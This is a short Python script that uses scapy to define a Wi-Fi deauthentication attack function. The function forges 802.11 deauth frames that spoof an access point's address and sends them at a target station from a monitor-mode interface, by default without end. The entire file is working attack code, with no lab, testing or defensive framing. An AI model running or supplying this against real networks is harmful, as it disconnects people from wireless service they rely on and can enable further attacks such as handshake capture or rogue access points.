from scapy.all import *


def deauth(target_bssid, ap_bssid, iface="wlan0mon", interval=0.1, count=0, verbose=True):

    """
    performs deauthentication attack on a desired station. 

    Parameters
    ----------
    target_bssid : str
        Target BSSID address to deauthenticate.
    ap_bssid : str
        Gateway BSSID address that target is authenticated with
    iface : str,optional
       Interface to use, must be in monitor mode (default 'wlan0mon')
    interval : decimal,optional
        The sending frequency between two frames sent in seconds (default 0.1)
    count : decimal,optional
        Number of deauthentication frames to send, specify 0 to keep sending infinitely, (default 0)
    verbose : bool,optional
       Wether to print messages (default True)
    """
    
    inter = float(interval)

    if count == 0:
        # if count is 0, it means we loop forever (until interrupt)
        loop = 1
        count = None
    else:
        loop = 0

    # printing some info messages"
    if verbose:
        if count:
            print(f"[+] Sending {count} frames every {inter}s...")
        else:
            print(f"[+] Sending frames every {inter}s for ever...")

    dot11 = Dot11(addr1=target_bssid, addr2=ap_bssid, addr3=ap_bssid)
    # stack them up
    packet = RadioTap()/dot11/Dot11Deauth(reason=7)
    # send the packet
    sendp(packet, inter=inter, count=count, loop=loop, iface=iface, verbose=verbose)
